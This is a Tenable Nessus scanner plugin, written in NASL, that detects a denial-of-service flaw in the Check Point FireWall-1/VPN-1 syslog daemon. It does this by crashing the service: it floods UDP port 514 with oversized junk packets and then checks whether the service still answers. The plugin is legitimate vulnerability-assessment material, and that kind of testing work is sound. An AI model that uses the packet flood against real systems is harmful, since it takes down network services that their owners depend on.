#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11613);
 script_version ("$Revision: 1.13 $");

 script_bugtraq_id(7159);
 script_xref(name:"OSVDB", value:"1017");
 
 script_name(english:"Check Point FireWall-1/VPN-1 Syslog Daemon Remote Overflow DoS");
 script_summary(english:"crashes the remote syslog daemon");
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote syslog service has a denial of service vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host is running a syslog server (most likely a Check Point\n",
     "NG syslog server) with a denial of service vulnerability.  A remote\n",
     "attacker could exploit this to crash this server.  It is not known\n",
     "whether or not this vulnerability could result in arbitrary code\n",
     "execution.\n\n",
     "Please note Nessus crashed the service while performing this check."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.nessus.org/u?828959b8"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.checkpoint.com/techsupport/ng/fp3_hotfix.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to NG FP3 HF2."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P"
 );
 script_end_attributes();

 script_category(ACT_DENIAL);	# ACT_FLOOD?
 script_family(english:"Firewalls");

 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 script_require_keys("Settings/ParanoidReport");

 exit(0);
}

#
# The strategy is to send an empty UDP packet and expect an ICMP-unreach message.
# If we don't get one, we crash the remote service and try again. If the results
# differ, then there was a service.
#
include("global_settings.inc");
if ( TARGET_IS_IPV6 ) exit(0);

if ( report_paranoia < 2 ) exit(0);

sport = rand() % 65000 + 1024;

function check(dport)
{ 
 local_var filter, i, ippkt, res, udppacket;

 ippkt = forge_ip_packet(
        ip_hl   :5,
        ip_v    :4,
        ip_tos  :0,
        ip_len  :20,
        ip_id   :31337,
        ip_off  :0,
        ip_ttl  :64,
        ip_p    :IPPROTO_UDP,
        ip_src  :this_host()
        );


  udppacket = forge_udp_packet(
        ip      :ippkt,
        uh_sport:sport,
        uh_dport:dport,
        uh_ulen :8
        );
	
  filter = string("src host ", get_host_ip(), " and dst host ", this_host(),
 " and icmp and (icmp[0] == 3  and icmp[28:2]==", sport, ")");
  for(i=0;i<5;i++)
  	send_packet(udppacket, pcap_active:FALSE);
	
  res = send_packet(udppacket, pcap_active:TRUE, pcap_filter:filter);
  if(res != NULL) return(1);
  else return(0);
}


if(check(dport:514) == 0 )
{ 
  soc = open_sock_udp(514);
  send(socket:soc, data:'<189>19: 00:01:04: Test\n');
  for(i=0;i<255;i++)
  {
  	send(socket:soc, data:crap(4096));
  }
  r = recv(socket:soc, length:4096);
  
  close(soc);
  sleep(1);
  
  if(check(dport:514) == 1)security_warning(port:514, proto:"udp");
}
